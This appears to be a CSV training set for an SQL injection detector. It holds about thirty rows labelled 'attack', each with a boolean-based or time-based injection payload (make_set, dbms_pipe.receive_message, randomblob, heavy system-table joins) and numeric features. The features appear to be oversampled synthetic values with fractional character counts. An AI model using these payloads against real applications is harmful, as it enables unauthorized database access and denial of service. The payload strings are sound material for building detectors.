id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000730,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000028,0.5378557553144279,89.30929307539942,27.252581409833173,3.6427809524658454,23.551548845899905,15.551548845899903,36.505162819666346,13.701032563933268,0.2642948678045248,0.17417652829265576,0.4078616102444368,0.15366699365838263,4.0,0.0,0.8505162819666344,0.0,0.0,1.1494837180333657,0.0,5.701032563933269,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1494837180333657,0.8505162819666343,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000731,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000056,0.7774653137315578,86.24339754194575,26.451161254839896,3.622274530348308,29.71937626129309,11.353483764519687,33.536430012906386,11.634107503226597,0.34588637632753216,0.12798019518613635,0.3902444999503601,0.13588892853597145,0.0,0.0,2.0,0.0,1.0,1.1829462483867017,0.0,5.268215006453193,0.0,0.8170537516132984,0.8170537516132984,4.365892496773403,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.1829462483867016,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1829462483867017
SMOTE_000732,attack,boolean,"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000035,1.233901028676563,132.18608099933635,31.299005785666886,3.496202837086656,35.0,15.0,59.5880694280026,22.598011571333767,0.2653767146249575,0.11373287769641034,0.44987083796333055,0.1710195697153016,4.803976857332467,1.1960231426675336,0.0,1.0,0.0,2.0,0.0,10.598011571333767,2.0,0.0,1.0,3.0,1.0,0.2990057856668834,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000733,attack,boolean,"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000035,1.09973120997225,129.7251663265333,32.03509979591998,3.6028185432577193,36.380133061226644,16.380133061226644,55.65496673469334,21.309933469386678,0.28002016589721157,0.12572347921982627,0.429530481643732,0.16472587323923019,5.309933469386677,0.17251663265333073,0.34503326530666145,1.0,0.0,2.0,0.0,9.82748336734667,1.6549667346933385,0.0,1.0,3.3450332653066615,1.0,0.1725166326533308,0.17251663265333067,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.17251663265333084,0.0,1.8274833673466695,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000734,attack,boolean,"-9281  )   where 8363  =  8363 or make_set  (  8220  =  5127,5127  )  --",nearest_attack_euclidean,R000005,1.8235477177047152,68.61581780208205,25.025737289351568,3.716959123497279,12.538605934027348,22.53860593402735,24.0,9.538605934027348,0.1820840719081438,0.32845432490026266,0.35128860718108534,0.13817299601050811,0.0,0.5128686446757831,2.512868644675783,0.0,0.0,2.0,0.0,3.0,0.0,0.5128686446757831,1.0,4.512868644675783,0.0,0.5128686446757831,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.487131355324217,0.5128686446757831,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000735,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000076,1.1179774904402346,151.18451730561145,32.88561020048795,4.106905036508942,74.75646630317169,16.0,44.542440801951805,15.885610200487951,0.49407239468344655,0.10642828762801491,0.29432273583917723,0.10517658184936124,0.0,0.442805100243976,2.0,0.0,1.0,2.0,0.0,5.442805100243977,0.0,0.0,2.0,5.0,0.0,0.44280510024397607,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000736,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000076,0.11944275020036223,139.7879992926264,32.0,4.126100833216475,67.66679922188905,16.202000117895597,41.0,14.91919995284176,0.4826941881729687,0.11653402517035696,0.29395514848906246,0.10681663816761179,0.0,0.0,2.0,0.0,1.0,2.0,0.0,5.04040002357912,0.0,0.04040002357911965,1.9595999764208805,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000737,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000055,1.0645188052934942,88.06671653186363,21.37143925682792,3.022012405051351,15.27623677958766,13.628560743172079,44.74287851365584,14.419040495448053,0.16996384320949498,0.1564623537483134,0.5084248586095268,0.16514894443266478,0.0,4.0,0.20952024772402644,0.0,1.0,1.2095202477240266,0.0,7.580959504551947,0.4190404954480529,0.0,0.0,2.419040495448053,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7904797522759737,0.20952024772402644,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000738,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000014,1.0410794638489418,131.05389962646316,31.72198566092331,4.2200470738466365,74.16595698276993,8.721985660923309,33.16595698276993,15.0,0.5660001078126067,0.06650787661204388,0.25296811620770093,0.11452389936764844,0.0,0.27801433907669204,2.0,0.0,1.0,1.0,0.0,4.0,0.278014339076692,0.0,2.721985660923308,4.0,0.0,0.27801433907669204,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.27801433907669204,0.721985660923308,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000739,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000029,1.2161615284224991,104.25057356126005,26.565880035988428,3.503576486188531,32.11881348928319,13.0,45.131760071976856,14.0,0.30630772538981094,0.12529126419961972,0.4334719566571327,0.1349290537534366,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,1.7105866906589529,0.14470665467052357,0.14470665467052357,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.8552933453294764,0.0,0.8552933453294764,0.0,0.0,0.0,1.1447066546705236,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8552933453294764,0.8552933453294764,3.710586690658953
SMOTE_000740,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R000077,0.34775876517705967,169.49733141233583,35.20106743506567,3.9097490526370113,56.20640461039401,25.195730259737324,65.99466282467165,22.100533717532834,0.3318265795396974,0.1485327460761003,0.3892253645478674,0.1304153098363349,4.402134870131338,0.0,1.0,0.0,0.0,1.8994662824671655,0.0,9.798932564934331,0.0,0.0,0.0,6.8994662824671655,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000741,attack,boolean,"1"" where 2072  =  2072 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000066,0.1305259513106211,142.0,33.35565904919176,3.900883529420008,41.0,24.0,52.0,25.0,0.2887323943661972,0.16901408450704225,0.36619718309859156,0.176056338028169,0.0,1.0,2.0,0.0,0.0,2.0,0.0,10.0,0.0,2.0,1.0,10.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000742,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000062,1.1933373144058164,105.99214797197116,26.77603288266026,3.340517752693321,25.884090427315716,13.444008220665065,49.77603288266026,16.88801644133013,0.2379535298861975,0.12805474276496734,0.4738370484195925,0.1601546789292426,0.44400822066506485,4.0,0.0,0.22200411033253253,0.0,2.0,0.0,8.444008220665065,0.0,0.7779958896674675,1.0,2.2220041103325325,0.22200411033253253,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000743,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000069,1.2287577374509608,158.0298887091819,31.014944354590945,3.8883232333920987,70.80604132971605,16.0,54.97011129081811,16.253736088647738,0.44737882676362245,0.10129462869969863,0.348484744564738,0.10284179997194093,0.0,0.25373608864773656,0.5074721772954733,0.0,1.0,2.0,0.0,7.492527822704527,0.0,0.0,2.0,3.5074721772954733,0.0,0.25373608864773667,0.25373608864773667,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.25373608864773667,1.0,0.7462639113522633,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000744,attack,boolean,"1  )   as wxms where 7272  =  7272 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000024,0.609628958715395,156.48864454681402,32.511355453185985,4.106392095422499,81.80683727589937,16.17045181772866,43.0,15.511355453185985,0.5226700287422714,0.10335605189156985,0.27479478387323175,0.09917913549292702,0.17045181772866114,0.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.1704518177286616,5.0,0.17045181772866125,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.8295481822713386,0.1704518177286613,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000745,attack,boolean,"1  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000034,0.14572952697677055,126.49171191328512,32.0,3.771959959324666,37.12292797832128,15.276587951222883,50.06146398916064,24.030731994580318,0.29349964143063556,0.12058318819331579,0.39588413072713974,0.19003303964890886,0.0,0.030731994580320166,2.0,0.0,0.0,1.0307319945803202,0.0,10.969268005419679,0.0,2.0,1.0,9.03073199458032,0.0,0.03073199458032022,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.03073199458032022,0.0,0.9692680054196797,0.030731994580320166,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.03073199458032
SMOTE_000746,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000021,0.5948997986698819,138.38057666122904,36.52427917346369,3.850376969398139,42.2388466775419,22.2388466775419,55.33201831430167,18.57086499184357,0.3053988592094271,0.16085974577936898,0.3996360169252532,0.13410537808595072,2.0,1.2854324959217864,1.8097116693854758,1.0,0.0,2.0,0.0,9.285432495921786,0.19028833061452421,0.0,1.0,4.809711669385476,1.0,1.0,0.9048558346927378,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.904855834692738,0.0,1.0951441653072622,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000747,attack,boolean,"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",nearest_attack_euclidean,R000030,2.0299007930373323,82.4755319680873,26.63237084346598,3.7580298489589494,21.0,17.84316112462131,29.816185421732992,13.81618542173299,0.2564517550169175,0.2137917702145028,0.3625741440574013,0.1671823307111784,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.39460485942233625,1.0,4.4215805623106545,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.6053951405776637,0.6053951405776637,0.0,0.6053951405776639,0.0,1.3946048594223361,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.605395140577664
SMOTE_000748,attack,boolean,"1%'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000058,0.5923873214741754,123.0913987694099,31.837983417932673,3.5176139425177215,31.25341535147723,15.105637871097029,55.15489703122376,21.57744851561188,0.24882556355885138,0.12441338828417972,0.45070460121421374,0.17605644694275513,5.78872425780594,0.0,0.10563787109702982,0.8943621289029704,0.0,2.0,0.0,9.78872425780594,2.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000749,attack,boolean,"1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  5098  =  5098",nearest_attack_euclidean,R000012,2.4349633414350857,131.18621517657192,29.0,4.0497659436115905,68.31465387866064,11.981899915482343,33.81552293389319,17.074138448535745,0.5311012535827149,0.08651799534259356,0.251193996670226,0.13118675440446553,1.388792327196383,0.0,0.0,0.0,1.0,1.5370692242678725,0.0,4.14827689707149,0.0,5.0,4.0,2.5370692242678725,0.4629307757321276,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.5370692242678725,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5370692242678725
SMOTE_000750,attack,boolean,"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000035,0.6721181296567283,130.2801998429997,31.16287141735712,3.516659296951478,35.0,15.0,57.95445700828546,22.32574283471424,0.26904671024950544,0.11530573296407376,0.44423851814769777,0.17140903863872303,5.348514330571515,0.6514856694284853,0.0,1.0,0.0,2.0,0.0,10.325742834714243,2.0,0.0,1.0,3.0,1.0,0.16287141735712118,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000751,attack,boolean,"1  )   where 9687  =  9687 and elt  (  9607  =  9432,9432  )  --",nearest_attack_euclidean,R000063,0.4412272270199604,65.04737096849044,24.232749104108983,3.6759820562563004,11.349123656163478,21.349123656163478,24.0,8.349123656163478,0.1741915311089614,0.32819972680996645,0.36961966968241217,0.12798907239865992,0.0,0.11637455205449254,2.1163745520544928,0.0,0.0,2.0,0.0,3.0,0.0,0.11637455205449232,1.0,4.116374552054492,0.0,0.11637455205449243,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.8836254479455076,0.11637455205449243,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000752,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,2.119855640095349,113.2199609960458,29.0,3.7328938921692956,43.70957347731114,14.72199609960458,40.72199609960458,14.066395319525494,0.3742209119540813,0.13123945010084503,0.370129362636719,0.12441027530835459,0.6556007800790842,0.0,0.0,0.0,1.0,1.344399219920916,0.0,6.655600780079084,0.0,2.3775968796836637,2.0331976597627475,2.3443992199209163,0.6556007800790841,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.3443992199209158,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.344399219920916
SMOTE_000753,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000008,1.906036272702977,164.87600070645175,37.04133309784942,3.9988790936154714,51.52066654892471,23.47933345107529,59.87600070645174,30.0,0.3126394747277451,0.14239800127960783,0.36294753358970583,0.1820149904029412,3.4793334510752905,0.0,1.041333097849419,0.0,0.0,2.0,0.0,11.479333451075291,0.0,2.0,1.0,11.041333097849419,1.0,0.0,0.5206665489247095,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.5206665489247095,0.47933345107529046,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000754,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000017,1.4491600401039768,161.00918660474719,33.14548188707063,4.066123984927686,82.42725905646469,16.0,46.43644566121189,16.14548188707063,0.5122462786884783,0.09941948944865794,0.2881438148518773,0.10019041701098652,0.0,0.5727409435353147,2.0,0.0,1.0,2.0,0.0,5.572740943535314,0.0,0.0,2.0,5.0,0.0,0.5727409435353147,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.42725905646468526,0.5727409435353147,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000755,attack,boolean,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000037,1.4931496735547287,141.0447838127576,33.194020234052985,3.5121379004761466,36.91043237448478,16.910432374484778,64.65674334465164,22.56717571913642,0.2620286774714392,0.12020869769266555,0.45796143374530596,0.15980119109058932,2.0,3.2835878595682084,0.4776080936211942,1.0,0.0,2.0,0.0,11.28358785956821,1.5223919063788058,0.0,1.0,3.4776080936211944,1.0,1.0,0.238804046810597,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.23880404681059716,0.0,1.761195953189403,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000756,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000032,1.5728451820320786,130.25951738262293,36.38722885296572,3.960795474482331,44.54891541186288,21.0,48.16168655889716,16.548915411862883,0.34196524704216996,0.1614847720406047,0.3698977632625284,0.12665221765469697,2.161686558897161,0.0,1.2255422940685594,0.0,1.0,2.0,0.0,7.387228852965721,0.0,1.0,1.0,5.0,1.0,0.0,0.6127711470342796,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.3872288529657202,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.38722885296572
SMOTE_000757,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000033,0.32872107290735536,167.50399577833514,36.165334740554954,3.9569449902856575,51.08266737027748,23.917332629722523,62.50399577833514,30.0,0.30501118215430345,0.14278424394155426,0.37308640346579913,0.1791181704383431,3.9173326297225235,0.0,0.16533474055495312,0.0,0.0,2.0,0.0,11.917332629722523,0.0,2.0,1.0,10.165334740554954,1.0,0.0,0.0826673702774765,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.08266737027747639,0.9173326297225235,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000758,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000045,0.6313401021561824,74.52293484089043,25.129751519491183,3.7039974148603125,13.782437879872798,24.0,25.740496961017634,11.0,0.18541042422230275,0.3225084869552448,0.3442646989679652,0.1478163898544872,0.0,1.0,3.0,0.0,0.217562120127204,2.0,0.0,3.2175621201272038,0.0,0.7824378798727962,0.7824378798727961,5.217562120127204,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
